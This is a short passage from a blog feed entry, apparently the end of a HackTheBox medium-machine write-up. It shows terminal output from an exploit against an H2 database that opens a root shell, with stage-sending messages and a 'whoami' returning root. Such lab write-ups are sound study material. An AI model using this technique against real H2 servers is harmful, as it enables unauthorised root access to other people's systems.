-<span class="o">[</span><span class="k">*</span><span class="o">]</span> Attempting to create database
-<span class="o">[</span>+] Created database and logged <span class="k">in</span>
-<span class="o">[</span><span class="k">*</span><span class="o">]</span> Sending stage 1
-<span class="o">[</span>+] Shell succeeded - ^c or quit to <span class="nb">exit
-</span>h2-shell<span class="nv">$ </span><span class="nb">whoami
-</span>root
-
-h2-shell<span class="err">$</span>
 </code></pre></div></div>]]></content><author><name>MiguelRega7</name></author><category term="hackthebox/machines/medium" /><summary type="html"><![CDATA[]]></summary></entry></feed>
